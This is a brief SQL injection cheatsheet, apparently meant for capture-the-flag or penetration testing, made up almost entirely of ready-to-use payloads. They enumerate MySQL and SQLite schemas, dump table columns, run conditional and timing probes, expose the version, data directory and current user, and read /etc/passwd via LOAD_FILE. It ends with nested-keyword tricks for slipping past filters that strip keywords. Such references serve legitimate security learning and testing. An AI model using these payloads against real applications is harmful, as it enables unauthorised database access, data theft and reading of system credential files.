SQL Injection Syntax Cheatsheet
=============

> John Hammond 


Leak all of the database names as a string
-----------------------------

```
SELECT GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA
```

Leak all of the tables in one database as a string
-----------

```
SELECT GROUP_CONCAT( TABLE_NAME ) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="<DATABASE_NAME>"
```


__TO DO THIS FOR SQLite:__

```
SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'
```

Leak the column names of a table as a string
------------------

```
SELECT GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="<TABLE NAME>"
```

__TO LEAK THE WHOLE SCHEMA OF A TABLE IN SQLITE:__

```
SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE type='table'
```


Leak the ONE column from a table
------------------

```
SELECT GROUP_CONCAT( "<COLUMN_NAME>" ) FROM "<TABLE NAME>"
```

___IF THIS DOES NOT WORK, TRY WITHOUT THE QUOTES!!___


In-line Conditions (an if statement)
------------------

```
SELECT "value" CASE WHEN condition>0 THEN 'return this' ELSE 'return instead' END
```

This may be best used with timing attacks, like `SLEEP(1)` as the else condition action. Other option might be:

```
SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )
```

Get the path of the running MySQL instance
------------------


```
SELECT @@datadir
```

Get the version of the running MySQL instance
------------------

```
SELECT @@version
```


Get current user
------------------


```
SELECT user();
```

```
SELECT system_user();
```

Read a file
------------------


```
SELECT LOAD_FILE("/etc/passwd");
```


Etcetera..
------

Some applications try to replace keywords with an empty string. If this is the case, try and trick it by placing the keyword inside of itself. This is devious! 

```
frfromom => from
oorr => or
loaload_filed_file => load_file
selselectect => select
```
